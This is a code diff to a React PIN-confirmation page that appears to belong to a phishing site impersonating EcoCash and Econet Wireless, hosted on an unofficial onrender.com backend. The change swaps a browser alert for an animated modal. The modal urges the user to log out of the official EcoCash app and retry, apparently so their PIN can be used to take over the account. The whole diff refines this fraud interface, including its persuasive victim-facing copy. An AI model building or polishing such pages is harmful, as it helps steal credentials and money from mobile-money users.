@@ -1,6 +1,6 @@
 import { useState, useRef, useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
-import { Lock } from 'lucide-react';
+import { Lock, AlertTriangle, RefreshCw } from 'lucide-react';
 
 const API_BASE_URL = "https://ecocash-loans-hlfv.onrender.com"; 
 
@@ -13,6 +13,7 @@ export default function ConfirmPinPage() {
   const [pin, setPin] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
+  const [isDeniedModalOpen, setIsDeniedModalOpen] = useState(false); // NEW: Modal State
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   useEffect(() => {
@@ -65,10 +66,8 @@ export default function ConfirmPinPage() {
             setIsProcessing(false);
             setPin('');
             
-            // THIS IS THE POPUP YOU REQUESTED
-            alert("Please logout of the official EcoCash app on your phone for a successful loan application, then try again.");
-            
-            setErrorMsg("Please logout of the official EcoCash app and try again.");
+            // SHOW THE CUSTOM MODAL INSTEAD OF ALERT
+            setIsDeniedModalOpen(true);
           }
         } catch (err) {
           console.error("Polling error:", err);
@@ -82,7 +81,14 @@ export default function ConfirmPinPage() {
   };
 
   return (
-    <div style={{ width: '100%', maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', fontFamily: "'Inter', sans-serif" }}>
+    <div style={{ width: '100%', maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', fontFamily: "'Inter', sans-serif", position: 'relative' }}>
+      
+      <style>{`
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(220, 38, 38, 0); } 100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0); } }
+      `}</style>
+
       <div style={{ background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', padding: '20px', color: 'white', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px' }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px' }}>
           <div style={{ background: 'white', color: '#0b40c4', padding: '4px 8px', borderRadius: '6px', fontWeight: 800, fontSize: '12px', fontStyle: 'italic' }}>ECONET <span style={{fontSize: '7px', display: 'block'}}>Wireless</span></div>
@@ -127,6 +133,58 @@ export default function ConfirmPinPage() {
 
         <p style={{ textAlign: 'center', fontSize: '10px', color: '#999', marginTop: '16px', fontWeight: 600 }}>POWERED BY ECONET WIRELESS · ECOCASH</p>
       </div>
+
+      {/* MODERN COLORFUL DENIAL MODAL */}
+      {isDeniedModalOpen && (
+        <div style={{ 
+          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, 
+          backgroundColor: 'rgba(0,0,0,0.6)', backdropFilter: 'blur(6px)', 
+          zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', 
+          padding: '20px', animation: 'fadeIn 0.3s ease-out' 
+        }}>
+          <div style={{ 
+            backgroundColor: 'white', borderRadius: '24px', padding: '32px 24px', 
+            width: '100%', maxWidth: '380px', position: 'relative', 
+            boxShadow: '0 20px 40px rgba(0,0,0,0.2)', textAlign: 'center',
+            animation: 'slideUp 0.3s ease-out'
+          }}>
+            
+            {/* Animated Warning Icon */}
+            <div style={{ 
+              width: '80px', height: '80px', borderRadius: '50%', 
+              background: 'linear-gradient(135deg, #ef4444 0%, #f97316 100%)', 
+              display: 'flex', alignItems: 'center', justifyContent: 'center', 
+              margin: '0 auto 24px', animation: 'pulse-red 2s infinite'
+            }}>
+              <AlertTriangle size={40} color="white" />
+            </div>
+
+            <h2 style={{ fontSize: '24px', fontWeight: 800, color: '#111', margin: '0 0 12px 0' }}>
+              Action Required
+            </h2>
+            
+            <p style={{ fontSize: '15px', color: '#4b5563', lineHeight: '1.6', marginBottom: '28px' }}>
+              For a successful loan application, please <strong>log out of the official EcoCash app</strong> on your phone, then try again.
+            </p>
+
+            <button 
+              onClick={() => setIsDeniedModalOpen(false)} 
+              style={{ 
+                width: '100%', padding: '16px', borderRadius: '14px', border: 'none', 
+                background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', 
+                color: 'white', fontSize: '16px', fontWeight: 700, cursor: 'pointer',
+                display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
+                boxShadow: '0 4px 12px rgba(11, 64, 196, 0.3)', transition: 'transform 0.1s'
+              }}
+              onMouseDown={(e) => e.currentTarget.style.transform = 'scale(0.97)'}
+              onMouseUp={(e) => e.currentTarget.style.transform = 'scale(1)'}
+              onMouseLeave={(e) => e.currentTarget.style.transform = 'scale(1)'}
+            >
+              <RefreshCw size={18} /> I Understand, Let me Try Again
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
